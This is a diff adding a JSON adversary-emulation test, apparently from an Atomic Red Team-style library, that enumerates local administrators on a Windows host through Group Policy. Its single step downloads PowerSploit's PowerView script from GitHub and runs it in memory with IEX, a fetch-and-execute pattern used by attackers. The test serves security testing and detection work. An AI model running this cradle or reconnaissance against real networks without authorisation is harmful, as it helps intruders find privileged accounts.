@@ -1,0 +1,31 @@
+{
+  "id": "64fdb43b-5259-467a-b000-1b02c00e510a",
+  "name": "Find Local Admins via Group Policy (PowerView)",
+  "description": "takes a computer and determines who has admin rights over it through GPO enumeration. Upon execution, information about the machine will be displayed.\n",
+  "platforms": [
+    "windows"
+  ],
+  "steps": [
+    {
+      "id": "5841ebb2-4419-488c-a090-22cf5bdcc883",
+      "type": "execute-command",
+      "data": {
+        "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Find-GPOComputerAdmin -ComputerName #{computer_name} -Verbose\n",
+        "command_type": "powershell"
+      },
+      "elevation_required": false
+    }
+  ],
+  "tags": [
+    "T1069.002",
+    "atomic-red-team"
+  ],
+  "input_arguments": [
+    {
+      "name": "computer_name",
+      "type": "path",
+      "description": "hostname of the computer to analyze",
+      "value": "$env:COMPUTERNAME"
+    }
+  ]
+}
